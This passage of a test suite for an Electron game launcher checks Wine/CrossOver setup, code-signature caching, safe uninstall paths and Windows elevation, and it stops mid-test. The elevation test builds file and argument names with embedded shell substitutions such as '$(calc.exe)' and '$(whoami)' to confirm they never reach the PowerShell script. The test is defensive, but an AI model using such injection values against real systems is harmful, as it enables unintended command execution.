import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import React from 'react';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { execFileSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { EventEmitter } from 'node:events';

import {
  resolveEffectiveLaunchPolicy as resolveTsLaunchPolicy,
  type LaunchPolicyBuildType,
} from '../src/contracts/launchPolicyResolver';
import type {
  LaunchMethod,
  StorefrontClientLifecyclePolicy,
} from '../src/contracts/launcher';
import type { StorefrontId } from '../src/contracts/platform';
import type { CanonicalGame } from '../src/contracts/game';
import {
  mergeStorefrontGames,
  computeCatalogGamesFingerprint,
} from '../src/services/integrations/integrationStorage';
import {
  isIndexedDbAvailable,
  vaultGet,
  vaultSet,
  vaultDelete,
} from '../src/services/storage/indexedDbVault';
import { extractDomain } from '../src/services/network/requestScheduler';
import { LauncherService } from '../src/services/launcher/launcherService';
import { ModalShell } from '../src/components/Common/ModalShell';
import { VirtualGridRows } from '../src/components/Common/VirtualContainers';

const requireCjs = createRequire(import.meta.url);
const launcherEngine = requireCjs('../electron/launcherEngine.cjs');
const uninstallSafety = requireCjs('../electron/launcher/uninstallSafety.cjs');
const processTreeUtils = requireCjs('../electron/launcher/processTreeUtils.cjs');
const windowsRegistryDiscovery = requireCjs('../electron/utils/windowsRegistryDiscovery.cjs');
const securityAndPathUtils = requireCjs('../electron/launcher/securityAndPathUtils.cjs');
const cloudSaveEngine = requireCjs('../electron/launcher/cloudSaveEngine.cjs');
const launcherIpcHandlers = requireCjs('../electron/ipc/launcherIpcHandlers.cjs');
const tokenVault = requireCjs('../electron/storefronts/tokenVault.cjs');
const semverUtils = requireCjs('../electron/utils/semverUtils.cjs');
const storeSync = requireCjs('../electron/storeSync.cjs');
const cjsLaunchPolicyResolver = requireCjs('../electron/launcher/launchPolicyResolver.cjs');

function makeTempDir(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), `ol-dual-os-${prefix}-`));
}

function createFakeChildProcess(pid = 48120) {
  const proc = new EventEmitter() as EventEmitter & {
    pid?: number;
    unref: () => void;
    kill: () => boolean;
    stderr: EventEmitter;
    stdout: EventEmitter;
  };
  proc.pid = pid;
  proc.unref = () => {};
  proc.kill = () => true;
  proc.stderr = new EventEmitter();
  proc.stdout = new EventEmitter();
  return proc;
}

describe('Dual-OS Comprehensive Audit Remediation Suite (macOS ARM64/Rosetta 2 + Windows x64)', () => {
  const createdTempDirs: string[] = [];

  function trackTempDir(prefix: string): string {
    const dir = makeTempDir(prefix);
    createdTempDirs.push(dir);
    return dir;
  }

  afterEach(() => {
    vi.restoreAllMocks();
    launcherEngine.setUserDataDir(null);
    while (createdTempDirs.length > 0) {
      const dir = createdTempDirs.pop();
      if (dir && fs.existsSync(dir)) {
        try {
          fs.rmSync(dir, { recursive: true, force: true });
        } catch {}
      }
    }
  });

  // ============================================================================
  // 1. macOS Native & Bottled (darwin ARM64 + Rosetta 2 x86_64)
  // ============================================================================
  describe('1. macOS Native & Bottled (darwin ARM64 + Rosetta 2 x86_64)', () => {
    it('verifies universal libone_metal_preload.dylib (arm64 + x86_64 + valid codesign), zero clang invocations, and SIP-protected executable/shebang DYLD_INSERT_LIBRARIES stripping', async () => {
      const dylibPath = path.resolve(__dirname, '../electron/helpers/libone_metal_preload.dylib');
      expect(fs.existsSync(dylibPath)).toBe(true);

      const childProcessMod = requireCjs('node:child_process');
      const execSpy = vi.spyOn(childProcessMod, 'execFileSync');
      const resolvedDylib = launcherEngine.ensureWineMetalPreloadDylib({
        userDataDir: trackTempDir('metal-preload-userdata'),
      });
      expect(resolvedDylib).toBe(dylibPath);
      const clangCalls = execSpy.mock.calls.filter(([cmd]) => /clang|xcrun|gcc/i.test(String(cmd)));
      expect(clangCalls).toHaveLength(0);
      execSpy.mockRestore();

      if (process.platform === 'darwin') {
        const lipoOut = execFileSync('lipo', ['-archs', dylibPath], { encoding: 'utf8' }).trim();
        const archs = lipoOut.split(/\s+/);
        expect(archs).toContain('arm64');
        expect(archs).toContain('x86_64');
        expect(() =>
          execFileSync('codesign', ['--verify', '--strict', dylibPath], { stdio: 'pipe' })
        ).not.toThrow();
      }

      // Behavioral verification of isMacSipProtectedExecutableOrScript inside launchGame
      const tmpDir = trackTempDir('sip-dyld');
      const tmpUserData = path.join(tmpDir, 'userdata');
      fs.mkdirSync(tmpUserData, { recursive: true });

      const sipPerlScript = path.join(tmpDir, 'sip-perl-wrapper.sh');
      fs.writeFileSync(sipPerlScript, '#!/usr/bin/perl\nexit 0;\n', { mode: 0o755 });

      const userBinary = path.join(tmpDir, 'user-native-game');
      fs.writeFileSync(userBinary, Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0x0c, 0x00, 0x00, 0x01]), {
        mode: 0o755,
      });

      const prevVitest = process.env.VITEST;
      const prevNodeEnv = process.env.NODE_ENV;
      launcherEngine.setUserDataDir(tmpUserData);

      try {
        delete process.env.VITEST;
        process.env.NODE_ENV = 'production';

        const runLaunchAndCaptureDyld = async (exePath: string, slug: string) => {
          let capturedDyld: string | undefined = 'UNSET_SENTINEL';
          const gameId = `custom-sip-${slug}-${Date.now()}`;
          launcherEngine.saveGameLaunchConfig(
            {
              gameId,
              executablePath: exePath,
              launchMethod: 'direct',
              environmentVariables: {
                DYLD_INSERT_LIBRARIES: '/opt/synthetic/liboverlay.dylib',
              },
            },
            { userDataDir: tmpUserData }
          );

          const res = await launcherEngine.launchGame(
            {
              gameId,
              title: `SIP Test ${slug}`,
              platformId: 'custom',
              executablePath: exePath,
              installPath: path.dirname(exePath),
            },
            {
              platform: 'darwin',
              gameSpawnFn: (_cmd: string, _args: string[], opts: { env?: Record<string, string> }) => {
                capturedDyld = opts?.env?.DYLD_INSERT_LIBRARIES;
                return createFakeChildProcess(51000 + Math.floor(Math.random() * 500));
              },
            }
          );
          expect(res.success).toBe(true);
          await launcherEngine.stopGame(gameId, { platform: 'darwin' });
          return capturedDyld;
        };

        // 1. Direct Apple SIP binary (/usr/bin/env) -> strips DYLD_INSERT_LIBRARIES
        if (fs.existsSync('/usr/bin/env')) {
          expect(await runLaunchAndCaptureDyld('/usr/bin/env', 'usr-bin-env')).toBeUndefined();
        }
        // 2. User script with SIP-protected shebang (#!/usr/bin/perl) -> strips DYLD_INSERT_LIBRARIES
        expect(await runLaunchAndCaptureDyld(sipPerlScript, 'perl-shebang')).toBeUndefined();
        // 3. Non-SIP user Mach-O binary -> preserves DYLD_INSERT_LIBRARIES
        expect(await runLaunchAndCaptureDyld(userBinary, 'user-macho')).toBe(
          '/opt/synthetic/liboverlay.dylib'
        );
      } finally {
        if (prevVitest !== undefined) process.env.VITEST = prevVitest;
        else delete process.env.VITEST;
        if (prevNodeEnv !== undefined) process.env.NODE_ENV = prevNodeEnv;
        else delete process.env.NODE_ENV;
        launcherEngine.setUserDataDir(null);
      }
    });

    it('caches macOS .app bundle code signatures via (dev, ino, mtimeMs) and invalidates when mtime changes', async () => {
      if (process.platform !== 'darwin') {
        const nonMac = launcherEngine.ensureMacAppCodeSignatureValid('/tmp/NonExistent.app', {
          platform: 'win32',
          allowCodesignInTest: true,
        });
        expect(nonMac.verified).toBe(false);
        return;
      }

      const tmpDir = trackTempDir('codesign-cache');
      const appBundle = path.join(tmpDir, 'SyntheticQuest.app');
      const macOsDir = path.join(appBundle, 'Contents', 'MacOS');
      fs.mkdirSync(macOsDir, { recursive: true });
      const plistPath = path.join(appBundle, 'Contents', 'Info.plist');
      fs.writeFileSync(
        plistPath,
        [
          '<?xml version="1.0" encoding="UTF-8"?>',
          '<plist version="1.0"><dict>',
          '  <key>CFBundleExecutable</key><string>SyntheticQuest</string>',
          '  <key>CFBundleIdentifier</key><string>com.synthetic.quest</string>',
          '</dict></plist>',
        ].join('\n'),
        'utf8'
      );
      const binPath = path.join(macOsDir, 'SyntheticQuest');
      // Copy /usr/bin/true bytes into temp bundle so codesign signs a valid Mach-O slice
      fs.copyFileSync('/usr/bin/true', binPath);
      fs.chmodSync(binPath, 0o755);

      const firstSync = launcherEngine.ensureMacAppCodeSignatureValid(appBundle, {
        platform: 'darwin',
        allowCodesignInTest: true,
      });
      expect(firstSync.verified).toBe(true);
      expect(firstSync.cached).toBeUndefined();

      const secondSync = launcherEngine.ensureMacAppCodeSignatureValid(appBundle, {
        platform: 'darwin',
        allowCodesignInTest: true,
      });
      expect(secondSync.verified).toBe(true);
      expect(secondSync.cached).toBe(true);

      const secondAsync = await launcherEngine.ensureMacAppCodeSignatureValidAsync(appBundle, {
        platform: 'darwin',
        allowCodesignInTest: true,
      });
      expect(secondAsync.verified).toBe(true);
      expect(secondAsync.cached).toBe(true);

      // Mutate mtimeMs on the inner executable -> invalidates (dev, ino, mtimeMs) cache
      const bumpedTime = new Date(Date.now() + 15_000);
      fs.utimesSync(binPath, bumpedTime, bumpedTime);

      const afterTouch = await launcherEngine.ensureMacAppCodeSignatureValidAsync(appBundle, {
        platform: 'darwin',
        allowCodesignInTest: true,
      });
      expect(afterTouch.verified).toBe(true);
      expect(afterTouch.cached).toBeUndefined();

      const reCached = await launcherEngine.ensureMacAppCodeSignatureValidAsync(appBundle, {
        platform: 'darwin',
        allowCodesignInTest: true,
      });
      expect(reCached.verified).toBe(true);
      expect(reCached.cached).toBe(true);
    });

    it('resets CrossOver graphics/DLSS env & cxbottle.conf keys when unset/auto, initializes WINE REGISTRY Version 2, and awaits pendingWineRegSyncByPrefix', async () => {
      const tmpDir = trackTempDir('cx-per-game');
      const bottleDir = path.join(tmpDir, 'SyntheticBottle');
      fs.mkdirSync(path.join(bottleDir, 'drive_c'), { recursive: true });
      const cxbottleConf = path.join(bottleDir, 'cxbottle.conf');
      fs.writeFileSync(
        cxbottleConf,
        [
          '[Bottle]',
          '"WineArch" = "win64"',
          '',
          '[EnvironmentVariables]',
          '"CX_GRAPHICS_BACKEND" = "d3dmetal"',
          '"CX_GRAPHICS_BACKEND_VERSION" = "4"',
          '"D3DM_ENABLE_METALFX" = "1"',
          '"DXMT_ENABLE_NVEXT" = "1"',
          '',
        ].join('\n'),
        'utf8'
      );

      const env: Record<string, string> = {
        CX_GRAPHICS_BACKEND: 'd3dmetal',
        WINED3DMETAL: '1',
        CX_GRAPHICS_BACKEND_VERSION: '4',
        D3DM_ENABLE_METALFX: '1',
        DXMT_ENABLE_NVEXT: '1',
      };

      launcherEngine.applyCrossOverPerGameSettings(
        { type: 'crossover', binaryPath: '' },
        {
          crossoverGraphicsBackend: 'auto',
          crossoverD3DMetalVersion: 'auto',
          crossoverHighResolutionMode: true,
        },
        env,
        bottleDir,
        { platform: 'darwin', skipRegistrySpawn: true }
      );

      expect(env.CX_GRAPHICS_BACKEND).toBeUndefined();
      expect(env.WINED3DMETAL).toBeUndefined();
      expect(env.CX_GRAPHICS_BACKEND_VERSION).toBeUndefined();
      expect(env.D3DM_ENABLE_METALFX).toBeUndefined();
      expect(env.DXMT_ENABLE_NVEXT).toBeUndefined();

      const updatedConf = fs.readFileSync(cxbottleConf, 'utf8');
      expect(updatedConf).not.toContain('CX_GRAPHICS_BACKEND');
      expect(updatedConf).not.toContain('D3DM_ENABLE_METALFX');
      expect(updatedConf).not.toContain('DXMT_ENABLE_NVEXT');

      const userReg = fs.readFileSync(path.join(bottleDir, 'user.reg'), 'utf8');
      expect(userReg.startsWith('WINE REGISTRY Version 2\n')).toBe(true);
      expect(userReg).toContain('[Software\\\\Wine\\\\Mac Driver]');
      expect(userReg).toContain('"RetinaMode"="y"');
      expect(userReg).toContain('"LogPixels"=dword:000000c0');

      // Verify pendingWineRegSyncByPrefix is awaited before ensureCompatibilityLayerReady resolves
      if (process.platform !== 'win32') {
        const regLogFile = path.join(tmpDir, 'live-reg-sync.log');
        const slowWineScript = path.join(tmpDir, 'fake-wine-reg.sh');
        fs.writeFileSync(
          slowWineScript,
          '#!/bin/sh\nsleep 0.06\nprintf "%s\\n" "$*" >> "$ONE_LAUNCHER_REG_LOG"\n',
          { mode: 0o755 }
        );
        const liveEnv: Record<string, string> = {
          ONE_LAUNCHER_REG_LOG: regLogFile,
        };
        await launcherEngine.ensureCompatibilityLayerReady(
          { type: 'wine', binaryPath: slowWineScript },
          {
            winePrefixPath: bottleDir,
            crossoverHighResolutionMode: false,
          },
          liveEnv,
          { platform: 'darwin', syncLiveWineReg: true }
        );
        expect(fs.existsSync(regLogFile)).toBe(true);
        const regLines = fs.readFileSync(regLogFile, 'utf8');
        expect(regLines).toContain('HKCU\\Software\\Wine\\Mac Driver');
        expect(regLines).toContain('HKCU\\Control Panel\\Desktop');
      }
    });

    it('scopes wasBottleSteamRunning by WINEPREFIX so Steam.exe in Bottle A never suppresses Bottle B Steam lifecycle', async () => {
      const tmpHome = fs.realpathSync(trackTempDir('bottle-steam-scope'));
      const tmpUserData = path.join(tmpHome, 'userdata');
      const bottlesRoot = path.join(tmpHome, 'Bottles');
      const bottleA = path.join(bottlesRoot, 'SteamBottleA');
      const bottleB = path.join(bottlesRoot, 'SteamBottleB');

      for (const b of [bottleA, bottleB]) {
        const steamDir = path.join(b, 'drive_c/Program Files (x86)/Steam');
        const gameDir = path.join(steamDir, 'steamapps/common/SyntheticValveGame');
        fs.mkdirSync(gameDir, { recursive: true });
        fs.writeFileSync(path.join(b, 'system.reg'), 'WINE REGISTRY Version 2\n', 'utf8');
        fs.writeFileSync(path.join(steamDir, 'steam.exe'), 'MZ', 'utf8');
        fs.writeFileSync(path.join(gameDir, 'game.exe'), 'MZ', 'utf8');
      }

      const fakeCrossOverBinDir = path.join(
        tmpHome,
        'Applications/CrossOver.app/Contents/SharedSupport/CrossOver/bin'
      );
      fs.mkdirSync(fakeCrossOverBinDir, { recursive: true });
      const fakeWineBin = path.join(fakeCrossOverBinDir, 'wine');
      fs.writeFileSync(fakeWineBin, '#!/bin/sh\nexit 0\n', { mode: 0o755 });

      for (const id of ['steam-bottle-b-scope-1', 'steam-bottle-b-scope-2']) {
        launcherEngine.saveGameLaunchConfig(
          {
            gameId: id,
            compatibilityLayer: 'crossover',
            crossoverBottle: 'SteamBottleB',
            winePrefixPath: bottleB,
          },
          { userDataDir: tmpUserData }
        );
      }

      const gameExeInBottleB = path.join(
        bottleB,
        'drive_c/Program Files (x86)/Steam/steamapps/common/SyntheticValveGame/game.exe'
      );

      // Process list shows Steam.exe running ONLY inside Bottle A -> Bottle B is cold, so Stage 1 Steam wake runs!
      const spawnCallsAOnly: string[][] = [];
      const psBottleAOnly = `C:\\Program Files (x86)\\Steam\\Steam.exe -silent WINEPREFIX="${bottleA}"`;
      const resAOnly = await launcherEngine.launchGame(
        {
          gameId: 'steam-bottle-b-scope-1',
          title: 'Synthetic Valve Game',
          platformId: 'steam',
          steamAppId: 620,
          platformGameId: '620',
          executablePath: gameExeInBottleB,
          installPath: path.dirname(gameExeInBottleB),
        },
        {
          platform: 'darwin',
          homedir: tmpHome,
          userDataDir: tmpUserData,
          enableTwoStageSteamColdStart: true,
          maxStartupCloudWaitMs: 15,
          pollIntervalMs: 10,
          mockProcessListOutput: psBottleAOnly,
          gameSpawnFn: (_cmd: string, args: string[]) => {
            spawnCallsAOnly.push(args);
            return createFakeChildProcess(52101 + spawnCallsAOnly.length);
          },
        }
      );
      expect(resAOnly.success).toBe(true);
      // Stage 1 ([bottleSteamExe, '-silent']) + Stage 2 ([bottleSteamExe, '-silent', '-applaunch', '620'])
      expect(spawnCallsAOnly).toHaveLength(2);
      expect(spawnCallsAOnly[0]).not.toContain('-applaunch');
      expect(spawnCallsAOnly[1]).toContain('-applaunch');
      await launcherEngine.stopGame('steam-bottle-b-scope-1', {
        platform: 'darwin',
        homedir: tmpHome,
        userDataDir: tmpUserData,
      });

      // Process list shows Steam.exe running inside Bottle B -> already warm, Stage 1 wake is skipped!
      const spawnCallsBWarm: string[][] = [];
      const psBottleBRunning = `C:\\Program Files (x86)\\Steam\\Steam.exe -silent WINEPREFIX="${bottleB}"`;
      const resBWarm = await launcherEngine.launchGame(
        {
          gameId: 'steam-bottle-b-scope-2',
          title: 'Synthetic Valve Game',
          platformId: 'steam',
          steamAppId: 620,
          platformGameId: '620',
          executablePath: gameExeInBottleB,
          installPath: path.dirname(gameExeInBottleB),
        },
        {
          platform: 'darwin',
          homedir: tmpHome,
          userDataDir: tmpUserData,
          enableTwoStageSteamColdStart: true,
          maxStartupCloudWaitMs: 15,
          pollIntervalMs: 10,
          mockProcessListOutput: psBottleBRunning,
          gameSpawnFn: (_cmd: string, args: string[]) => {
            spawnCallsBWarm.push(args);
            return createFakeChildProcess(52201 + spawnCallsBWarm.length);
          },
        }
      );
      expect(resBWarm.success).toBe(true);
      expect(spawnCallsBWarm).toHaveLength(1);
      expect(spawnCallsBWarm[0]).toContain('-applaunch');
      await launcherEngine.stopGame('steam-bottle-b-scope-2', {
        platform: 'darwin',
        homedir: tmpHome,
        userDataDir: tmpUserData,
      });
    });

    it('enforces 1 GB cloud save rolling backup default cap on darwin vs 256 MB on win32 and resolves waitForActivePostSessionWork', async () => {
      const resolvedCloudModulePath = requireCjs.resolve('../electron/launcher/cloudSaveEngine.cjs');
      const loadCloudEngineForPlatform = (targetPlatform: 'darwin' | 'win32') => {
        const origDescriptor = Object.getOwnPropertyDescriptor(process, 'platform');
        delete requireCjs.cache[resolvedCloudModulePath];
        Object.defineProperty(process, 'platform', { value: targetPlatform, configurable: true });
        try {
          return requireCjs('../electron/launcher/cloudSaveEngine.cjs');
        } finally {
          if (origDescriptor) {
            Object.defineProperty(process, 'platform', origDescriptor);
          }
          delete requireCjs.cache[resolvedCloudModulePath];
        }
      };

      const darwinCloud = loadCloudEngineForPlatform('darwin');
      const win32Cloud = loadCloudEngineForPlatform('win32');

      // Verify a synthetic 300 MB stat-mocked save folder succeeds under darwin default (1 GB)
      // and skips with maxBytes=256 MB on win32 default, while 1.1 GB skips with maxBytes=1 GB on darwin!
      const tmpDir = trackTempDir('cloud-backup-cap');
      const saveSrc = path.join(tmpDir, 'saves');
      const backupDarwin = path.join(tmpDir, 'backup-darwin');
      const backupDarwinHuge = path.join(tmpDir, 'backup-darwin-huge');
      const backupWin = path.join(tmpDir, 'backup-win32');
      fs.mkdirSync(saveSrc, { recursive: true });
      const slotPath = path.join(saveSrc, 'slot01.sav');
      fs.writeFileSync(slotPath, 'synthetic-save-payload', 'utf8');

      let mockedSlotBytes = 300 * 1024 * 1024;
      const origStatSync = fs.statSync.bind(fs);
      const statSpy = vi.spyOn(fs, 'statSync').mockImplementation(((p: fs.PathLike, opts?: any) => {
        const real = origStatSync(p, opts);
        if (String(p) === slotPath) {
          return Object.assign(Object.create(Object.getPrototypeOf(real)), real, {
            size: mockedSlotBytes,
          });
        }
        return real;
      }) as typeof fs.statSync);

      try {
        // 300 MB exceeds win32 default (256 MB) -> backedUp: false
        const winRes = win32Cloud.createCloudSaveRollingBackup(saveSrc, backupWin);
        expect(winRes.backedUp).toBe(false);
        expect(String(winRes.reason || '')).toMatch(/exceed|large|max|size/i);

        // 300 MB fits inside darwin default (1 GB) -> backedUp: true
        const macRes = darwinCloud.createCloudSaveRollingBackup(saveSrc, backupDarwin);
        expect(macRes.backedUp).toBe(true);
        expect(macRes.totalBytes).toBe(300 * 1024 * 1024);

        // 1.1 GB exceeds darwin default (1 GB) -> backedUp: false
        mockedSlotBytes = 1100 * 1024 * 1024;
        const macHugeRes = darwinCloud.createCloudSaveRollingBackup(saveSrc, backupDarwinHuge);
        expect(macHugeRes.backedUp).toBe(false);
        expect(String(macHugeRes.reason || '')).toMatch(/exceed|large|max|size/i);
      } finally {
        statSpy.mockRestore();
      }

      const drainResult = await launcherEngine.waitForActivePostSessionWork(1500);
      expect(drainResult).toEqual({ completed: true, remaining: 0 });
    });
  });

  // ============================================================================
  // 2. Windows Native (win32 x64) & First-Party Coexistence
  // ============================================================================
  describe('2. Windows Native (win32 x64) & First-Party Coexistence', () => {
    it('blocks unsafe OS roots, user folders, library containers, and bottle roots in isSafeToDeleteInstallPath while allowing leaf game folders', () => {
      const winHome = 'C:\\Users\\player_one';
      const macHome = '/Users/player_one';

      // Blocked on win32 (including mixed-case & trailing-slash variants)
      const blockedWinPaths = [
        'c:\\program files',
        'C:\\Program Files (x86)\\',
        'C:\\Windows',
        'D:\\',
        'D:\\SteamLibrary',
        'D:\\SteamLibrary\\steamapps',
        'D:\\SteamLibrary\\steamapps\\common',
        'C:\\Users\\player_one',
        'C:\\Users\\player_one\\Downloads',
        'C:\\Users\\player_one\\Documents',
        'C:\\Users\\player_one\\OneDrive\\Documents',
        'C:\\Users\\player_one\\Games\\OneLauncher',
        'C:\\Users\\player_one\\CrossOver\\Bottles\\Steam',
        'C:\\Users\\player_one\\CrossOver\\Bottles\\Steam\\drive_c',
      ];
      for (const badPath of blockedWinPaths) {
        expect(
          uninstallSafety.isSafeToDeleteInstallPath(badPath, {
            platform: 'win32',
            homedir: winHome,
          }),
          `Expected win32 path to be blocked: ${badPath}`
        ).toBe(false);
      }

      // Blocked on darwin
      const blockedMacPaths = [
        '/',
        '/Applications',
        '/Users/player_one',
        '/Users/player_one/Downloads',
        '/Users/player_one/Library/Application Support/CrossOver/Bottles/Steam',
        '/Users/player_one/Library/Application Support/CrossOver/Bottles/Steam/drive_c',
      ];
      for (const badPath of blockedMacPaths) {
        expect(
          uninstallSafety.isSafeToDeleteInstallPath(badPath, {
            platform: 'darwin',
            homedir: macHome,
          }),
          `Expected darwin path to be blocked: ${badPath}`
        ).toBe(false);
      }

      // Allowed valid leaf game installation directories
      expect(
        uninstallSafety.isSafeToDeleteInstallPath(
          'D:\\SteamLibrary\\steamapps\\common\\Portal 2',
          { platform: 'win32', homedir: winHome }
        )
      ).toBe(true);
      expect(
        uninstallSafety.isSafeToDeleteInstallPath(
          'C:\\Users\\player_one\\Games\\OneLauncher\\GOG\\Cyberpunk 2077',
          { platform: 'win32', homedir: winHome }
        )
      ).toBe(true);
      expect(
        uninstallSafety.isSafeToDeleteInstallPath(
          '/Users/player_one/Library/Application Support/CrossOver/Bottles/Steam/drive_c/GOG Games/The Witcher 3',
          { platform: 'darwin', homedir: macHome }
        )
      ).toBe(true);
    });

    it('falls back to PowerShell Start-Process -Verb RunAs on Windows elevation errors (EACCES / -4094 / 740) using env vars without string interpolation', async () => {
      const tmpDir = trackTempDir('win32-uac-elevation');
      const trickyDir = path.join(tmpDir, "O'Connor $(calc.exe) Games");
      fs.mkdirSync(trickyDir, { recursive: true });
      const trickyExe = path.join(trickyDir, "Launch'Game$(whoami).exe");
      fs.writeFileSync(trickyExe, 'MZ', 'utf8');

      const elevationErrors: Array<NodeJS.ErrnoException> = [
        Object.assign(new Error('spawn EACCES'), { code: 'EACCES', errno: -4092 }),
        Object.assign(new Error('uv_spawn failed'), { errno: -4094 }),
        Object.assign(new Error('The requested operation requires elevation. (740)'), {
          errno: 740,
        }),
      ];

      for (let i = 0; i < elevationErrors.length; i++) {
        const errToThrow = elevationErrors[i];
        const calls: Array<{ cmd: string; args: string[]; env: Record<string, string> }> = [];
        const gameId = `win32-elev-case-${i}`;

        const res = await launcherEngine.launchGame(
          {
            gameId,
            title: `Elevation Case ${i}`,
            platformId: 'custom',
            executablePath: trickyExe,
            installPath: trickyDir,
            launchArguments: '--profile "A\'B$(calc)"',
          },
          {
            platform: 'win32',
            homedir: tmpDir,
            userDataDir: path.join(tmpDir, 'userdata'),
            gameSpawnFn: (cmd: string, args: string[], opts: { env?: Record<string, string> }) => {
              calls.push({ cmd, args, env: opts?.env || {} });
              if (calls.length === 1) {
                throw errToThrow;
              }
              return createFakeChildProcess(61000 + i);
            },
          }
        );

        expect(res.success).toBe(true);
        expect(calls).toHaveLength(2);
        expect(calls[1].cmd).toBe('powershell.exe');
        const psCommandIdx = calls[1].args.indexOf('-Command');
        expect(psCommandIdx).toBeGreaterThanOrEqual(0);
        const psScript = calls[1].args[psCommandIdx + 1];

        expect(psScript).toContain('Start-Process');
        expect(psScript).toContain('-Verb RunAs');
        expect(psScript).toContain('-PassThru');
        expect(psScript).toContain('$env:ONE_LAUNCHER_PS_EXE');
        // Never interpolate untrusted path or args into PowerShell script code!
        expect(psScript).not.toContain("O'Connor");
        expect(psScript).not.toContain('calc');
        expect(psScript).not.toContain('whoami');

        expect(calls[1].env.ONE_LAUNCHER_PS_EXE).toBe(trickyExe);
        expect(calls[1].env.ONE_LAUNCHER_PS_CWD).toBe(trickyDir);
        expect(JSON.parse(calls[1].env.ONE_LAUNCHER_PS_ARGS_JSON)).toEqual([
          '--profile',
          "A'B$(calc)",
        ]);

        await launcherEngine.stopGame(gameId, {
          platform: 'win32',
          homedir: tmpDir,
          userDataDir: path.join(tmpDir, 'userdata'),
        });
      }
    });

    it('matches exact Windows tasklist CSV image tokens in extractMatchedPidFromProcessOutput (trustedinstaller.exe !== rust.exe)', () => {
      const falsePositiveCsv = '"trustedinstaller.exe","1024","Services","0","12,000 K"\r\n';
      expect(
        processTreeUtils.extractMatchedPidFromProcessOutput(
          falsePositiveCsv,
          ['rust', 'rust.exe'],
          'win32'
        )
      ).toBe(0);

      const trueMatchCsv = [
        '"trustedinstaller.exe","1024","Services","0","12,000 K"',
        '"rust.exe","4242","Console","1","500,000 K"',
      ].join('\r\n');
      expect(
        processTreeUtils.extractMatchedPidFromProcessOutput(
          trueMatchCsv,
          ['rust', 'rust.exe'],
          'win32'
        )
      ).toBe(4242);
    });

    it('discovers non-C: Steam, GOG Galaxy, and Epic Games Launcher paths from mocked Windows Registry queries', () => {
      windowsRegistryDiscovery.invalidateWindowsRegistryDiscoveryCache();

      const mockRegExec = (_bin: string, args: string[]) => {
        const key = String(args[1] || '');
        const val = String(args[3] || '');
        if (/Valve\\Steam/i.test(key) && /SteamPath/i.test(val)) {
          return `\r\nHKEY_CURRENT_USER\\Software\\Valve\\Steam\r\n    SteamPath    REG_SZ    D:\\Steam\r\n`;
        }
        if (/Valve\\Steam/i.test(key) && /SteamExe/i.test(val)) {
          return `\r\nHKEY_CURRENT_USER\\Software\\Valve\\Steam\r\n    SteamExe    REG_SZ    D:\\Steam\\steam.exe\r\n`;
        }
        if (/GOG\.com\\GalaxyClient\\paths/i.test(key) && /client/i.test(val)) {
          return `\r\n${key}\r\n    client    REG_SZ    E:\\GOG Galaxy\r\n`;
        }
        if (/EpicGames\\EpicGamesLauncher/i.test(key) && /AppDataPath/i.test(val)) {
          return `\r\n${key}\r\n    AppDataPath    REG_SZ    F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\\r\n`;
        }
        if (/Epic Games\\Unreal Engine/i.test(key) && /INSTALLDIR/i.test(val)) {
          return `\r\n${key}\r\n    INSTALLDIR    REG_SZ    F:\\Epic Games\r\n`;
        }
        throw new Error('Registry key not found');
      };

      const steamRes = windowsRegistryDiscovery.discoverWindowsSteamRegistryPaths({
        platform: 'win32',
        useCache: false,
        execFileSyncFn: mockRegExec,
      });
      expect(steamRes.steamRoot).toBe('D:\\Steam');
      expect(steamRes.steamExe).toBe('D:\\Steam\\steam.exe');

      const gogRes = windowsRegistryDiscovery.discoverWindowsGogGalaxyRegistryPaths({
        platform: 'win32',
        useCache: false,
        execFileSyncFn: mockRegExec,
      });
      expect(gogRes.clientDir).toBe('E:\\GOG Galaxy');
      expect(gogRes.clientExe).toBe('E:\\GOG Galaxy\\GalaxyClient.exe');

      const epicRes = windowsRegistryDiscovery.discoverWindowsEpicRegistryPaths({
        platform: 'win32',
        useCache: false,
        execFileSyncFn: mockRegExec,
      });
      expect(epicRes.appDataPath).toBe('F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\');
      expect(epicRes.manifestsDir).toBe(
        'F:\\ProgramData\\Epic\\EpicGamesLauncher\\Data\\Manifests'
      );
      expect(epicRes.launcherExeCandidates).toContain(
        'F:\\Epic Games\\Launcher\\Portal\\Binaries\\Win64\\EpicGamesLauncher.exe'
      );
    });

    it('preserves UTF-8 non-ASCII OneDrive Known Folders (rejecting U+FFFD corruption) and preserves root desktop.ini while excluding it from realFileCount', () => {
      const childProcessMod = requireCjs('node:child_process');
      const secModulePath = requireCjs.resolve('../electron/launcher/securityAndPathUtils.cjs');
      const origPlatformDesc = Object.getOwnPropertyDescriptor(process, 'platform');
      const origUserProfile = process.env.USERPROFILE;

      let psStdout = JSON.stringify({
        Personal: 'C:\\Users\\player_josé\\OneDrive\\Documentos',
        SavedGames: 'C:\\Users\\player_josé\\Saved Games',
        LocalAppData: 'C:\\Users\\player_josé\\AppData\\Local',
        AppData: 'C:\\Users\\player_josé\\AppData\\Roaming',
        LocalLow: 'C:\\Users\\player_josé\\AppData\\LocalLow',
      });

      const execSpy = vi
        .spyOn(childProcessMod, 'execFileSync')
        .mockImplementation(((cmd: string) => {
          if (/powershell/i.test(String(cmd))) {
            return psStdout;
          }
          return '';
        }) as any);

      const osMod = requireCjs('node:os');
      const homedirSpy = vi.spyOn(osMod, 'homedir').mockReturnValue('C:\\Users\\player_josé');
      delete requireCjs.cache[secModulePath];
      Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });
      process.env.USERPROFILE = 'C:\\Users\\player_josé';

      try {
        const winSecUtils = requireCjs('../electron/launcher/securityAndPathUtils.cjs');
        winSecUtils.clearCachedWindowsKnownFolders();
        const utf8Folders = winSecUtils.resolveHostWindowsKnownFolders();
        expect(utf8Folders.documents).toBe('C:\\Users\\player_josé\\OneDrive\\Documentos');
        expect(utf8Folders.savedGames).toBe('C:\\Users\\player_josé\\Saved Games');

        // U+FFFD OEM codepage corruption in PowerShell output MUST be rejected (falls back cleanly without U+FFFD)
        winSecUtils.clearCachedWindowsKnownFolders();
        psStdout = JSON.stringify({
          Personal: 'C:\\Users\\player_jos\uFFFD\\OneDrive\\Documentos',
        });
